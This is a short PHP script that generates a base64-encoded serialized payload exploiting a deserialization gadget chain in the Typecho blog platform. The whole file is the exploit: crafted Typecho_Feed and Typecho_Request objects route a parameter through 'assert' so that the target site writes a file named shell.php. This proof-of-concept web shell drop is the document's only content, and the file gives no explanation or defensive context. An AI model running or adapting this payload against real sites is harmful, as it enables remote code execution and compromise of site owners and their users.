<?php

class Typecho_Feed{
    private $_type = 'ATOM 1.0';
    private $_items = array();
    public function addItem(array $item){
        $this->_items[] = $item;
    }
}
class Typecho_Request{
    private $_params = array('screenName'=> "file_put_contents('shell.php','<?php echo \\'hello world\\';?>')");
    private $_filter = array('assert');
}
$payload1 = new Typecho_Feed();
$payload2 = new Typecho_Request();
$payload1->addItem(array('author' => $payload2));
$exp = array('adapter' => $payload1, 'prefix' => 'typecho');
echo base64_encode(serialize($exp));

?>




